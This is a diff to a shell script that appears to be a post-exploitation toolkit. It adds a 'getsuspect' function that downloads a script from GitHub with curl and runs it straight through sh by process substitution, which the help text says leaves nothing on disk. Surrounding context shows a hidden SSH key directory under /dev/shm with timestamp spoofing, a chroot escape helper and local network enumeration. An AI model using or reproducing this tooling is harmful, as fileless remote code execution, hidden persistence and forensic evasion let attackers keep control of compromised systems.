@@ -184,6 +184,12 @@ else
 fi
 }
 
+getsuspect() {
+#ask and ye shall receive
+#this janky, awful shortcut
+sh <(curl https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh) 
+}
+
 keyinstall() {
 touch /dev/shm/.q/.ssh
 touch -r /
@@ -396,6 +402,7 @@ echo "[*] getusers - pull all users with a shell"
 echo "[*] getpty - pop a pty with script"
 echo "[*] getidle - list all ptys and their idle times accurately."
 echo "[*] getnet - attempt to enumerate hosts on the local network with ping"
+echo "[*] getsuspect - pull my suspect tool from github and run it via an FD, no disk touching."
 echo "[*] getuservices - list all running services with non-user accounts in passwd"
 echo "[*] getescape - attempt to escape chroot via bad privs on the /proc/ filesystem."
 echo "[*] getdbus - list all dbus services."
